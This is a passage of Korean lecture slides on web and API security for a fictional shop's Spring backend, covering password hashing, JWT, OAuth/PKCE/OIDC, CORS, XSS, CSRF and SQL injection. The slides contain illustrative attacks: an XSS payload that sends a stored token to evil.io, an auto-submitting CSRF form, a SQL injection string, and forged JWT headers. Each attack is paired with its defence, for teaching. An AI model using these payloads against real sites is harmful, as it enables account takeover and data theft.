표의 마지막 칸이 중요합니다. 서명은 내용을 숨기지 않고, 암호화는 내용이 바뀌지 않았음을 보장하지 않습니다. 그래서 TLS 같은 실제 프로토콜은 암호화와 무결성 검사를 함께 하는 방식(AES-GCM 같은 인증 암호화)을 씁니다. 이제 남은 해시의 쓰임새, 비밀번호 저장으로 넘어갑니다.

비밀번호는 암호화하지 않고 해시한다

모아마켓 회원 테이블에 비밀번호를 어떻게 넣어야 할까요? 출발점은 DB는 언젠가 유출될 수 있다는 가정입니다. 백업 파일 분실, SQL Injection(5부), 내부자 모두 실제로 일어나는 일입니다. 유출된 순간에도 비밀번호가 드러나지 않아야 합니다. 사용자는 같은 비밀번호를 다른 사이트에도 쓰기 때문입니다.

평문 저장은 말할 것도 없고, 암호화 저장도 답이 아닙니다. 암호화는 되돌리려고 하는 것이라 키가 어딘가에 있어야 하고, 같은 서버에 있는 키는 DB와 함께 털리기 쉽습니다. 키가 새는 순간 모든 비밀번호가 한 번에 풀립니다.

생각해 보면 서버는 원래 비밀번호를 알 필요가 없습니다. 로그인 때 "입력한 값이 가입 때 값과 같은가"만 확인하면 됩니다. 그래서 되돌릴 수 없는 해시를 저장하고, 로그인 때 입력값을 같은 방식으로 해시해 비교합니다.

그런데 SHA-256으로 해시해 두면 충분할까요? 다음 슬라이드에서 보듯 공격자는 해시를 되돌리지 않고도 비밀번호를 알아냅니다.

빠른 해시는 대입 공격에 금방 뚫린다

해시를 되돌릴 수 없어도 공격자는 추측해서 맞춰 볼 수 있습니다. 후보 비밀번호를 하나씩 해시해 유출된 값과 같은지 보는 것을 대입 공격이라고 합니다. 사람들이 쓰는 비밀번호는 생각보다 좁은 범위에 몰려 있어서, 흔한 비밀번호 목록과 그 변형만 시험해도 상당수가 풀립니다.

이때 SHA-256의 장점인 속도가 약점이 됩니다. SHA-256은 대용량 데이터를 빨리 처리하려고 만든 함수라, 게임용 GPU 한 장으로도 초당 수십억 개 이상의 후보를 시험할 수 있습니다.

또 같은 비밀번호는 언제나 같은 해시가 됩니다. 그러면 공격자는 흔한 비밀번호들의 해시를 미리 한 번 계산해 표로 만들어 두고, 유출된 DB와 표를 맞대기만 하면 됩니다. 이런 미리 계산한 표(를 저장 공간에 맞게 압축한 형태)를 레인보우 테이블이라고 합니다. 같은 비밀번호를 쓴 회원 수천 명이 한 번에 드러납니다.

정리하면 막아야 할 것은 두 가지입니다. 미리 계산해 두는 것, 그리고 한 번 시도가 너무 싼 것입니다.

솔트는 미리 계산을, 키 스트레칭은 대량 시도를 막는다

솔트는 회원마다 따로 만든 무작위 값으로, 비밀번호에 섞어 해시합니다. 같은 비밀번호라도 회원마다 해시가 달라지니 미리 만든 표가 쓸모없어지고, 공격자는 회원 한 명 한 명을 따로 공략해야 합니다. 솔트는 비밀이 아니어서 해시 옆에 그대로 저장합니다.

키 스트레칭은 해시를 수천~수만 번 반복하거나 많은 메모리를 쓰게 만들어 한 번 계산하는 비용을 일부러 키우는 것입니다.

숫자로 보면 효과가 분명합니다. 로그인 한 번에 해시 계산이 수십 밀리초 걸리는 것은 사용자에게 티가 나지 않습니다. 그런데 공격자에게는 초당 수십억 번이던 시도가, GPU로도 초당 수천 번 수준으로 떨어집니다.

이 두 장치를 처음부터 내장한 비밀번호 전용 해시가 다음 슬라이드의 bcrypt와 Argon2입니다.

bcrypt와 Argon2는 솔트와 비용을 내장한다

bcrypt는 솔트와 cost(반복 횟수의 지수, 1 올리면 두 배 느려짐)를 결과 문자열에 함께 적습니다. 별도 솔트 컬럼이 필요 없고, cost를 올려도 옛 해시를 검증할 수 있습니다.

Argon2id는 계산 중 많은 메모리를 요구합니다. GPU는 연산 코어는 많아도 코어당 메모리가 적어 병렬 공격이 어렵습니다. 표는 웹 보안 비영리 단체 OWASP의 권장값이고, PBKDF2는 미국 정부 표준(FIPS) 인증이 필요할 때 씁니다.

Spring에서는 PasswordEncoder 하나로 끝낸다

@Bean
PasswordEncoder passwordEncoder() {
  return PasswordEncoderFactories
      .createDelegatingPasswordEncoder();
}

// 가입: 저장할 문자열 만들기
String hash = encoder.encode(rawPassword);
// → {bcrypt}$2a$10$N9qo8uLO…

// 로그인: 입력값과 비교
encoder.matches(input, hash);

솔트 생성과 반복은 직접 짜지 않고 Spring Security의 PasswordEncoder에 맡깁니다. encode는 저장할 문자열을, matches는 입력값이 맞는지를 돌려줍니다.

위임형 인코더는 앞에 {bcrypt}처럼 알고리즘 이름을 붙여 저장합니다. 나중에 Argon2로 바꿔도 옛 회원의 해시를 읽을 수 있고, 로그인 성공 때 새 방식으로 다시 저장해 서서히 옮길 수 있습니다. 기본은 bcrypt, cost 10입니다.

4부

토큰은 어떻게 스스로를 증명하는가

1부에서 미뤄 둔 질문으로 돌아갑니다. 모아마켓 서버가 내준 JWT가 3부의 MAC과 서명으로 어떻게 위조를 막는지, "만료 전까지 취소할 수 없다"는 빈틈을 어떻게 메우는지 봅니다. 이어서 다른 회사의 서비스에 권한을 맡기는 OAuth와, 그 위에 로그인을 얹은 OIDC, 그리고 이 모든 검사를 Spring 서버에 끼우는 Spring Security까지 따라갑니다.

JWT는 점으로 이은 세 조각이다

JWT의 앞 두 조각은 JSON을 Base64url(2부의 Base64에서 주소에 문제 되는 +, /를 바꾼 변형)로 적은 것입니다. Header는 서명 알고리즘(alg)과 키 이름(kid)을, Payload는 토큰이 주장하는 내용인 클레임을 담습니다.

클레임은 누가, 누구에게, 언제까지를 적는다

클레임 이름은 자유롭게 정해도 되지만, 표준이 미리 정해 둔 등록 클레임을 쓰면 라이브러리가 검사를 대신해 줍니다. 이름이 세 글자인 것은 토큰이 매 요청에 실리므로 크기를 줄이려는 것입니다.

role처럼 서비스가 필요한 값을 더해도 되지만, 토큰이 커지면 모든 요청이 무거워지므로 인가에 꼭 필요한 것만 넣습니다.

클레임뜻모아마켓 예
sub주체(누구에 대한 토큰)회원 7
iss발급자auth.shop.com
aud받을 대상api.shop.com
exp만료 시각발급 15분 뒤
iat발급 시각초 단위 시각
jti토큰 고유 ID로그아웃 처리에 사용

서명이 있으니 서버는 저장소를 보지 않는다

  1. 발급

    로그인 성공 시 서버가 Header와 Payload를 만들고 서명을 붙여 줍니다.

  2. 전송

    앱은 매 요청 Authorization: Bearer <토큰> 헤더에 싣습니다.

  3. 서명 검증

    받은 Header.Payload로 서명을 다시 계산해 일치하는지 봅니다.

  4. 클레임 검증

    exp, iss, aud를 확인하고 sub를 사용자로 씁니다.

Authorization은 인증 정보를 싣는 표준 헤더이고, Bearer는 "가진 사람이 주인"인 토큰이라는 뜻입니다. 그래서 훔친 사람도 쓸 수 있으니 반드시 HTTPS로만 보냅니다.

Payload의 role을 ADMIN으로 바꾸면 서명이 맞지 않습니다. 이것이 저장소를 조회하지 않고도 요청을 믿을 수 있는 이유이고, 동시에 서버가 아무것도 기억하지 않으니 도중에 취소하기 어려운 이유입니다.

HS256은 키 공유, RS256은 공개키 배포

3부의 두 도구가 그대로 JWT의 두 방식이 됩니다. HS256은 HMAC-SHA256, 즉 MAC입니다. 검증하는 모든 서버가 같은 비밀키를 가져야 하므로 검증만 하면 되는 서버도 토큰을 위조할 수 있습니다. 키는 256비트 이상이어야 합니다(RFC 7518).

RS256(RSA 서명)이나 ES256(타원 곡선 서명)은 전자 서명입니다. 인증 서버만 개인키로 서명하고, API 서버들은 공개키로 검증만 합니다. 서비스가 여럿이면 RS256 계열이 기본입니다.

공개키는 JWKS로 나눠 주고 kid로 갈아 끼운다

{ "keys": [
  { "kty": "RSA", "alg": "RS256",
    "kid": "k2",
    "n": "0vx7agoebGcQ…", "e": "AQAB" },
  { "kty": "RSA", "alg": "RS256",
    "kid": "k1",
    "n": "xjlCRBqkOGdq…", "e": "AQAB" }
] }

API 서버는 공개키를 어디서 얻을까요? 인증 서버가 공개키 목록을 JWKS라는 JSON으로 정해진 주소에 올려 두고, API 서버가 받아 캐시합니다. n, e는 RSA 공개키를 이루는 두 숫자입니다.

키를 여러 개 올려 두는 이유는 교체입니다. 새 키 k2로 서명을 시작해도 k1로 서명된 토큰이 만료될 때까지 k1을 남겨 둡니다. 검증 쪽은 Header의 kid로 맞는 키를 고릅니다.

Payload는 암호화가 아니라 인코딩이다

$ echo 'eyJzdWIiOiI3Iiwicm9sZSI6IlVTRVIifQ' \
    | base64 -d
{"sub":"7","role":"USER"}

# 검증 설정에서 막아야 할 Header
{"alg":"none"}         # 서명 없는 토큰
{"alg":"HS256"} + 공개키  # 알고리즘 혼동

Base64url은 누구나 되돌리므로 서명은 변조를 막을 뿐 내용을 숨기지 않습니다(3부 표의 마지막 칸). 이메일 같은 개인 정보는 Payload에 넣지 않고, 숨겨야 하면 암호화 형식인 JWE를 따로 씁니다.

또 Header는 공격자가 쓴 것입니다. none을 믿으면 서명 없는 토큰이 통과합니다. HS256을 믿으면 서버는 공개키를 HMAC 비밀키로 쓰는데, 공개키는 누구나 아니 공격자가 맞는 MAC을 만듭니다. 허용 알고리즘은 서버 설정으로 고정합니다(RFC 8725).

Access는 짧게, Refresh는 길게 나눈다

이제 남은 빈틈, 취소 문제를 메웁니다. JWT를 도중에 취소하기 어렵다면 탈취돼도 피해가 작도록 수명을 짧게 하면 됩니다. 하지만 15분마다 다시 로그인하라고 할 수는 없습니다.

그래서 토큰을 둘로 나눕니다. Access Token은 API 호출에 쓰는 짧은 토큰(수 분~1시간)이고, Refresh Token은 새 Access Token을 받는 데만 쓰는 긴 토큰(수일~수주)입니다.

항목AccessRefresh
보내는 곳모든 API재발급 엔드포인트만
서버 검증서명만(무상태)저장소 조회(상태)
노출 빈도높음낮음
탈취 시 피해만료까지 짧게계속 재발급 가능
 Refresh Token은 서버에 기록해 두어야 취소할 수 있습니다. 상태가 일부 돌아오지만, 조회는 재발급 때만 일어납니다.

Access가 만료되면 Refresh로 조용히 바꾼다

모아마켓 앱서버
GET /orders Bearer AT1(만료)
만료 감지 401 invalid_token
POST /auth/refresh RT1 저장소 확인
200 AT2, RT2
GET /orders Bearer AT2

사용자는 이 과정을 보지 못합니다. 앱이 401을 받으면 Refresh Token으로 새 토큰을 받아 원래 요청을 다시 보냅니다.

서버는 재발급 때만 저장소를 보고 "이 Refresh Token이 아직 유효한가"를 확인합니다. 여기서 막으면 늦어도 Access Token 수명 안에 그 사용자의 접근이 끊깁니다. 응답에 새 Refresh Token(RT2)까지 주는 이유가 다음 슬라이드의 Rotation입니다.

Rotation은 재사용을 탈취의 신호로 본다

  1. 로그인

    서버가 RT1을 발급하고 같은 로그인에서 나온 토큰 계열(family)로 기록합니다.

  2. 정상 재발급

    RT1을 내면 새 Access와 RT2를 주고, RT1은 "사용됨"으로 표시합니다.

  3. 재사용 감지

    이미 쓴 RT1이 다시 오면 탈취로 보고 계열 전체를 폐기합니다.

  4. 재로그인

    공격자도, 정상 사용자도 RT2가 막혀 다시 로그인해야 합니다.

Rotation은 Refresh Token을 쓸 때마다 새것으로 바꿔 주는 방식입니다. 정상 앱은 항상 최신 토큰만 쓰므로 옛 토큰이 다시 나타났다면 누군가 복사해 갔다는 뜻입니다. 누가 진짜인지 모르니 전부 끊습니다.

특히 모바일 앱이나 브라우저 JavaScript처럼 코드가 사용자 손에 있어 비밀을 숨길 수 없는 클라이언트를 공개 클라이언트라고 하는데, OAuth 보안 모범 사례 문서(RFC 9700)는 이들의 Refresh Token에 Rotation을 요구합니다.

로그아웃은 무상태에 상태를 조금 더하는 일이다

// 1. Refresh Token 계열 폐기
refreshTokenRepository.deleteByFamily(familyId);

// 2. 남은 Access Token은 jti를 블랙리스트에
long ttl = claims.getExpiration().getTime()
         - System.currentTimeMillis();
redis.set("bl:" + claims.getId(), "1", ttl);

// 3. 인증 필터에서 매 요청 확인
if (redis.exists("bl:" + jti)) throw ...;

앱이 토큰을 지워도 복사본은 만료까지 유효합니다. 즉시 막으려면 서버가 "이 토큰은 무효"라고 기억해야 합니다. 토큰마다 고유한 jti 클레임을 키로 삼아 블랙리스트에 넣습니다.

남은 수명만큼만 보관하면 되므로 Redis의 TTL(정한 시간이 지나면 키가 저절로 지워지는 기능, 8장)과 잘 맞습니다. 로그아웃한 토큰만 담기니 작게 유지됩니다.

OAuth 2.0은 비밀번호 대신 권한을 위임한다

지금까지는 모아마켓이 자기 회원에게 토큰을 줬습니다. 이번엔 반대 상황입니다. 모아마켓이 "배송 예정일을 내 구글 캘린더에 넣어 주기" 기능을 만들려면 사용자의 구글 계정에 접근해야 합니다. 사용자의 구글 비밀번호를 받으면 모든 권한이 넘어가고, 취소하려면 비밀번호를 바꿔야 합니다.

OAuth 2.0은 사용자가 구글에서 직접 동의하고, 모아마켓은 범위(scope)와 기한이 정해진 Access Token만 받게 하는 인가 위임 규약입니다.

역할이 예에서
Resource Owner캘린더 주인인 사용자
Client모아마켓 서버
Authorization Server구글 로그인과 동의 화면
Resource Server구글 캘린더 API
 OAuth에서 Client는 브라우저가 아니라 권한을 받아 쓰는 서비스를 말합니다.

위임을 받으려면 먼저 클라이언트로 등록한다

흐름을 보기 전에 준비물이 있습니다. 모아마켓 개발자는 구글 개발자 콘솔에 모아마켓을 클라이언트로 등록하고 세 가지를 받거나 정합니다.

client_id는 "모아마켓"이라는 공개된 식별자입니다. client_secret은 모아마켓 서버만 아는 비밀번호로, 토큰을 받을 때 "정말 모아마켓 서버가 요청한다"를 증명합니다. 서버 안에 숨길 수 있는 클라이언트를 기밀 클라이언트라고 하며, 앞에서 본 공개 클라이언트(앱, 브라우저 JavaScript)는 secret을 숨길 수 없습니다.

redirect_uri는 사용자가 동의한 뒤 구글이 사용자를 돌려보낼 모아마켓 주소입니다. 구글은 등록된 주소로만 돌려보내므로, 공격자가 결과를 자기 사이트로 빼돌리지 못합니다.

마지막으로 scope는 요청할 권한의 범위입니다. 모아마켓은 "캘린더 일정 쓰기"만 요청하고, 사용자는 동의 화면에서 바로 그 범위를 보고 승인합니다. 메일이나 사진은 건드릴 수 없습니다. 이제 이 준비물이 흐름 속에서 어떻게 쓰이는지 봅니다.

Code 흐름은 토큰을 백 채널로 숨긴다

이 흐름의 정식 이름은 Authorization Code 흐름입니다. 그림의 각 단계와 code_challenge, state는 다음 두 슬라이드에서 차례로 풉니다.

주소창에는 일회용 code만 지나간다

그림 위쪽 절반은 사용자의 브라우저가 302 응답(2장의 "다른 곳을 보라"는 3xx)을 따라 모아마켓과 구글 사이를 오가는 구간입니다. 이렇게 브라우저 주소창을 거치는 통로를 프론트 채널이라고 합니다. 주소는 브라우저 기록, 서버 로그, 다른 사이트로 넘어가는 Referer 헤더에 남기 쉬워 여기로 지나가는 값은 새어 나갈 수 있다고 봐야 합니다.

그래서 구글은 동의가 끝나면 토큰 대신 code를 돌려줍니다. code는 한 번만 쓸 수 있고 수명이 몇 분 이하인 교환권입니다. 모아마켓 서버는 이 code를 들고 구글에 직접 요청해(그림 아래쪽, 백 채널) 토큰으로 바꿉니다. 이때 client_secret도 함께 내므로, code가 새어도 모아마켓 서버가 아니면 바꿀 수 없습니다.

예전에는 토큰을 주소창으로 바로 주는 Implicit 흐름도 있었지만, 토큰이 프론트 채널에 그대로 노출돼 지금은 쓰지 말라고 합니다(RFC 9700).

첫 302에 붙은 state는 모아마켓이 만든 무작위 값으로, 돌아올 때 같은 값인지 확인해 "내가 시작한 흐름의 결과"인지 가립니다. 남이 자기 code를 내 브라우저에 밀어 넣는 공격을 막습니다.

PKCE는 code를 훔쳐도 쓸 수 없게 만든다

모아마켓 모바일 앱이 직접 구글과 이 흐름을 한다면 문제가 생깁니다. 앱은 공개 클라이언트라 client_secret이 없으니, 리다이렉트 도중 다른 앱이 code를 가로채면 그대로 토큰으로 바꿀 수 있습니다.

PKCE는 흐름을 시작할 때마다 클라이언트가 무작위 code_verifier(43~128자)를 만들어 숨겨 두고, 그 SHA-256 해시인 code_challenge만 먼저 보냅니다. 토큰 교환 때 원본 verifier를 내야 하므로 code만 훔친 공격자는 토큰을 받을 수 없습니다.

3부의 해시 성질이 그대로 쓰입니다. 해시는 되돌릴 수 없으니 프론트 채널에 challenge가 노출돼도 verifier를 알아낼 수 없습니다. 매 흐름마다 만드는 일회용 비밀이 client_secret을 대신하는 셈입니다.

지금의 기본값

RFC 9700은 공개 클라이언트에 PKCE를 필수로, 기밀 클라이언트에도 권장합니다. 그래서 그림에도 PKCE를 넣어 두었습니다.

OIDC는 OAuth 위에 "누구인지"를 얹는다

이번엔 모아마켓에 "구글로 로그인" 버튼을 답니다. OAuth의 Access Token은 "캘린더를 써도 된다"는 인가 증표일 뿐, 사용자가 누구인지 알려 주는 표준 형식이 없습니다. 로그인에는 바로 그것, 인증이 필요합니다.

OIDC는 scope에 openid를 넣으면 토큰 응답에 ID Token을 함께 주도록 OAuth를 확장한 규약입니다. 흐름은 앞의 그림과 같고, ID Token은 JWT라 앞에서 본 서명 검증을 그대로 씁니다.

Spring Security가 필터로 만들어진 이유

지금까지 본 검사들, 즉 토큰 서명 확인, 블랙리스트 조회, 권한 판단을 모아마켓 Spring 서버의 어디에 둘까요? 컨트롤러마다 넣으면 하나만 빠뜨려도 구멍이 됩니다. 모든 요청이 예외 없이 지나는 곳이 필요합니다.

6장에서 본 요청의 길을 떠올려 봅시다. 요청은 Tomcat 단계의 Filter를 지난 뒤에야 DispatcherServlet에 닿고, 그다음 Interceptor와 컨트롤러로 갑니다. Filter는 정적 파일 요청까지 모든 요청을 가장 먼저 보므로, 보안 검사를 두기에 가장 확실한 자리입니다. 그래서 Spring Security는 인증과 인가를 Filter의 사슬로 만들었습니다.

6장에서 Filter에서 난 예외는 DispatcherServlet 밖이라 @ControllerAdvice가 잡지 못한다고 했습니다. 그래서 Spring Security는 인증, 인가 실패를 자기 필터 안에서 직접 401, 403 응답으로 바꿉니다. 그 일을 맡는 필터가 ExceptionTranslationFilter입니다.

다음 슬라이드에서 Tomcat의 Filter와 Spring의 Bean이 어떻게 연결되는지 봅니다.

요청은 보안 필터 사슬을 지나 컨트롤러에 닿는다

  1. 서블릿 필터DelegatingFilterProxy
  2. FilterChainProxyURL별 체인 선택
  3. 인증 필터토큰 검증, 사용자 설정
  4. AuthorizationFilter권한 확인, 거절
  5. DispatcherServlet컨트롤러 호출

Tomcat은 Spring Bean을 모르므로, Tomcat에는 DelegatingFilterProxy라는 다리 역할의 필터 하나만 등록하고, 이 필터가 Spring Bean인 FilterChainProxy에 일을 넘깁니다. 그 안에 URL별로 고르는 SecurityFilterChain이 있고, CORS, CSRF, 인증, 인가 필터가 순서대로 돕니다.

인증 필터는 검증한 사용자를 SecurityContextHolder에 넣습니다. 기본 저장 방식은 5장의 ThreadLocal, 즉 스레드마다 따로 두는 저장소라서 같은 요청을 처리하는 컨트롤러가 꺼내 씁니다. 실패는 ExceptionTranslationFilter가 401, 403으로 바꿉니다.

모아마켓 API의 보안 설정은 한 메서드에 모인다

@Bean
SecurityFilterChain api(HttpSecurity http)
    throws Exception {
  http
    .cors(withDefaults())
    .csrf(csrf -> csrf.disable())
    .sessionManagement(s ->
        s.sessionCreationPolicy(STATELESS))
    .authorizeHttpRequests(a -> a
      .requestMatchers("/auth/**").permitAll()
      .requestMatchers(GET, "/products/**").permitAll()
      .requestMatchers("/admin/**").hasRole("ADMIN")
      .anyRequest().authenticated())
    .oauth2ResourceServer(o -> o.jwt(withDefaults()));
  return http.build();
}

위에서부터 CORS 필터를 켜고(5부), 쿠키 대신 Bearer 토큰을 쓰므로 CSRF 검사를 끄며(이유는 5부 CSRF), 세션을 만들지 않게 합니다. 이어서 경로별 인가 규칙을 위에서부터 차례로 적용합니다.

마지막 줄이 인증 필터입니다. JWT를 검증하는 Resource Server 필터를 켜면, 설정한 JWKS 주소에서 공개키를 받아 서명과 exp를 검사합니다.

5부

브라우저는 경계를 긋고, 공격은 그 틈을 노린다

4부의 토큰은 모바일 앱이든 브라우저든 똑같이 동작했습니다. 그런데 모아마켓 웹 화면처럼 API를 부르는 주체가 브라우저라면 사정이 달라집니다. 이 부에서는 브라우저가 왜 특별한지, 그래서 생긴 경계 규칙(SOP, CORS)과 그 규칙의 틈이나 서버의 실수를 노리는 대표 공격 세 가지(XSS, CSRF, SQL Injection)를 봅니다.

브라우저는 여러 사이트의 코드를 한곳에서 돌린다

모바일 앱은 모아마켓이 만든 코드만 돌립니다. 브라우저는 다릅니다. 사용자는 한 브라우저 탭에서 모아마켓에 로그인해 두고, 다른 탭에서 처음 보는 사이트를 엽니다. 그 사이트의 JavaScript도 같은 브라우저 안에서 돌고, 마음대로 HTTP 요청을 보낼 수 있습니다.

여기에 2장에서 본 쿠키의 성질이 겹칩니다. 브라우저는 도메인이 맞는 요청이면 누가 보낸 요청이든 쿠키를 자동으로 붙입니다. 그러니 아무 대책이 없다면 처음 보는 사이트의 스크립트가 모아마켓 API를 호출하고, 브라우저는 사용자의 로그인 쿠키를 실어 주고, 스크립트는 응답으로 온 주문 내역과 주소를 읽어 갈 수 있습니다.

브라우저 보안 규칙은 이 상황을 막으려고 생겼습니다. 기준이 되는 단위가 출처입니다. 출처는 URL의 스킴(https), 호스트(shop.com), 포트(443) 세 가지의 조합이고, 셋이 모두 같아야 같은 출처입니다. 경로는 상관없습니다.

다음 슬라이드의 동일 출처 정책이 이 단위로 경계를 긋습니다.

SOP: 출처가 다르면 응답을 읽지 못한다

동일 출처 정책(SOP)은 한 출처의 스크립트가 다른 출처에서 온 응답을 읽지 못하게 하는 브라우저 규칙입니다. 처음 보는 사이트의 스크립트가 모아마켓 API를 불러도 응답 내용을 읽을 수 없으니 주문 내역이 새지 않습니다.

주의할 점은 SOP가 막는 것이 읽기라는 것입니다. 다른 출처로 폼을 보내거나 이미지를 불러오는 것은 웹 초창기부터 허용돼 왔고, 지금도 됩니다. 이 틈이 뒤의 CSRF로 이어집니다.

 모아마켓의 웹 화면(shop.com)과 API(api.shop.com)도 서로 다른 출처입니다.

CORS는 서버가 허락한 출처에만 문을 연다

그런데 SOP대로라면 모아마켓 웹 화면도 자기 API 응답을 못 읽습니다. 이 정당한 경우를 위한 예외 규칙이 CORS입니다. 브라우저가 요청에 Origin을 붙이고, 서버가 Access-Control-Allow-Origin으로 허락한 출처면 응답을 스크립트에 넘깁니다.

요청이 위험할 수 있으면 브라우저는 먼저 OPTIONS로 허락을 묻는데, 이를 사전 요청이라 합니다.

사전 요청은 "예전에는 못 보내던 요청"에만 붙는다

어떤 요청이 사전 요청 없이 바로 나갈까요? 메서드가 GET, HEAD, POST이고, Content-Type이 폼 형식이나 text/plain이며, 특별한 헤더가 없는 요청입니다. 이를 단순 요청이라 합니다. HTML 폼으로도 원래 보낼 수 있던 요청이라, 이제 와서 막아도 얻는 것이 없기 때문입니다.

반대로 application/json 본문, Authorization 헤더, PATCH, DELETE는 폼으로 못 보내던 요청입니다. 이런 요청을 받으리라 예상하지 못한 옛 서버를 지키려고, 브라우저는 서버가 동의할 때만 보냅니다.

CORS는 브라우저가 지키는 규칙이지 방패가 아니다

단순 요청은 서버에 그대로 도착해 처리까지 끝납니다. CORS는 그 뒤 응답을 스크립트에 넘길지만 정합니다. 또 curl이나 서버 간 호출에는 브라우저가 없으니 CORS도 없습니다.

그러니 CORS는 API 보호 수단이 아닙니다. CORS 설정과 상관없이 인증과 인가는 서버가 해야 합니다. CORS는 이미 있는 SOP 장벽에 "이 출처는 통과"라는 구멍을 내는 장치일 뿐입니다.

쿠키를 보낼 때는 와일드카드 금지

쿠키를 함께 보내는 요청(credentials 요청)에는 Allow-Origin: *가 통하지 않습니다. 정확한 출처와 Allow-Credentials: true를 함께 줘야 합니다.

Max-Age를 길게 줘도 브라우저가 상한을 둡니다(Chromium 2시간, Firefox 24시간).

XSS: 남의 스크립트가 내 페이지에서 돈다

<!-- 공격자가 리뷰 본문으로 저장 -->
<img src=x onerror="fetch('//evil.io?c='+
  localStorage.getItem('token'))">

<!-- 서버가 그대로 HTML에 넣으면 -->
<!-- 리뷰를 연 모든 사용자의 브라우저에서 -->
<!-- onerror 스크립트가 실행됨 -->

SOP가 막는 것은 다른 출처의 스크립트입니다. 공격자가 자기 스크립트를 모아마켓 페이지 안에 심으면 어떨까요? XSS는 공격자의 입력이 HTML로 해석되어 피해자 브라우저에서 실행되는 공격입니다.

심긴 코드는 shop.com 출처로 돌기 때문에 SOP가 막지 않고, localStorage의 토큰을 읽어 공격자 서버로 보냅니다. 위처럼 DB에 저장됐다 퍼지면 저장형, 링크의 쿼리 문자열에 실려 한 번 튀어나오면 반사형이라 부릅니다.

XSS는 출력할 때 이스케이프하고, CSP로 한 번 더 막는다

<!-- 출력 시 HTML 이스케이프 -->
&lt;img src=x onerror=...&gt;
  → 화면에 글자로만 보임

# 응답 헤더: 허용한 스크립트만 실행
Content-Security-Policy: script-src 'self'

# 쿠키: 스크립트가 읽지 못하게
Set-Cookie: rt=…; HttpOnly

방어의 중심은 이스케이프, 즉 <를 &lt;처럼 바꿔 브라우저가 문법이 아니라 글자로 보게 만드는 것입니다. 입력이 들어갈 자리가 HTML 본문인지, 속성인지, JavaScript 안인지에 따라 바꿀 문자가 다르므로 템플릿 엔진의 자동 이스케이프를 끄지 않습니다.

그래도 빠뜨린 곳을 대비해 CSP 헤더로 실행할 스크립트 출처를 제한하고, 2장의 HttpOnly 쿠키로 스크립트의 쿠키 읽기를 막습니다.

CSRF: 자동으로 붙는 쿠키를 악용한다

<!-- 피해자가 shop.com에 로그인된 상태 -->
<form action="https://shop.com/orders/42/cancellation"
      method="POST">
  <input name="refundTo" value="attacker">
</form>
<script>document.forms[0].submit()</script>

모아마켓 웹이 세션 쿠키로 로그인한다고 해 봅시다. 사용자가 evil.io를 열면 숨은 폼이 shop.com으로 전송됩니다. 폼 전송은 SOP가 막지 않는 단순 요청이고, 브라우저는 shop.com 쿠키를 자동으로 붙입니다.

서버에는 로그인한 사용자의 정상 요청으로 보입니다. CSRF는 이렇게 사용자 몰래 요청을 위조하는 공격이며, 공격자는 응답을 읽을 필요조차 없습니다.

CSRF는 공격 페이지가 알 수 없는 값으로 막는다

CSRF가 통하는 이유는 서버가 "쿠키가 붙어 있다"만 보고 사용자의 의도라고 믿기 때문입니다. 그러니 방어는 공격 페이지는 알 수 없고 진짜 모아마켓 페이지만 아는 증거를 요구하는 것입니다.

첫째, CSRF 토큰입니다. 서버가 폼을 그릴 때 무작위 값을 숨겨 넣고, 전송된 값이 세션의 값과 같은지 확인합니다. evil.io는 SOP 때문에 모아마켓 페이지를 읽을 수 없으니 이 값을 모릅니다. Spring Security가 기본으로 켜 두는 방어가 이것입니다.

둘째, 쿠키의 SameSite 속성입니다. 여기서 사이트는 출처보다 넓은 단위로, shop.com과 api.shop.com처럼 등록 도메인이 같으면 같은 사이트입니다. SameSite=Lax면 다른 사이트에서 시작된 POST에는 쿠키가 붙지 않습니다. 2장에서 봤듯 기본값이 브라우저마다 다르니 항상 명시합니다. 셋째, 요청의 Origin 헤더가 자기 출처인지 확인합니다.

4부 설정에서 CSRF를 끈 이유도 여기서 나옵니다. 토큰을 Authorization 헤더에 담는 API는 브라우저가 자동으로 붙여 주는 것이 없으므로, 공격 페이지가 인증된 요청을 만들 수 없습니다. 쿠키로 인증한다면 CSRF 방어를 끄면 안 됩니다.

SQL Injection: 데이터가 코드가 된다

// 위험: 입력이 SQL 문법의 일부가 됨
String sql = "SELECT * FROM product"
  + " WHERE name = '" + keyword + "'";
// keyword = ' OR '1'='1  → 전체 행

// 안전: 구조를 먼저 고정하고 값만 바인딩
PreparedStatement ps = conn.prepareStatement(
  "SELECT * FROM product WHERE name = ?");
ps.setString(1, keyword);

마지막 공격은 브라우저가 아니라 서버 코드의 실수입니다. 문자열을 이어 붙여 SQL을 만들면 DB는 어디까지가 값이고 어디부터가 명령인지 구분하지 못합니다. 따옴표 하나로 조건이 "항상 참"이 되고, 더 나쁘면 다른 테이블까지 읽힙니다.

PreparedStatement는 ? 자리를 비워 둔 SQL 구조를 먼저 DB에 보내 파싱하고, 값은 나중에 따로 보냅니다. 입력이 문법으로 해석될 여지가 없습니다.

ORM을 써도 문자열을 이어 붙이면 뚫린다

// JPA: JPQL도 이어 붙이면 위험
"… WHERE p.name = '" + kw + "'"
em.createQuery("… WHERE p.name = :kw")
  .setParameter("kw", kw);

// MyBatis: #{}는 바인딩, ${}는 치환
ORDER BY ${sort}   // 위험

// 바인딩 못 하는 자리는 허용 목록으로
Set.of("price", "createdAt").contains(sort)

6장의 JPA 쿼리 언어 JPQL도 결국 SQL로 바뀌므로, 문자열을 이어 붙이면 같은 문제가 생깁니다. 이름 붙은 파라미터로 바인딩합니다. SQL을 XML에 적어 쓰는 MyBatis에서는 #{}가 바인딩, ${}가 그냥 문자열 치환입니다.

정렬 컬럼명처럼 값이 아니라 SQL 구조의 일부여서 바인딩할 수 없는 자리는, 미리 정한 허용 목록에 있는 값만 받습니다.

6부

운영에서 마주치는 선택과 사고

원리를 알아도 운영에서는 "앱 옛 버전을 깨지 않고 응답을 바꾸려면?", "토큰을 브라우저 어디에 둘까?", "토큰이 털리면 무엇부터 끊을까?", "왜 프론트에서만 CORS 에러가 날까?" 같은 질문이 남습니다. 모아마켓 운영 중에 실제로 내리는 판단을 순서대로 정리합니다.

원리 실무 버저닝 정책, 토큰 보관과 쿠키 설정값, 사고 대응 순서, 흔한 설정 실수를 다룹니다.

버전은 깨는 변경이 생길 때만 올린다

1부에서 API는 계약이라고 했습니다. 그렇다고 영원히 못 바꾸는 것은 아니고, 바꿀 때 옛 클라이언트가 깨지는가로 나눠 판단합니다.

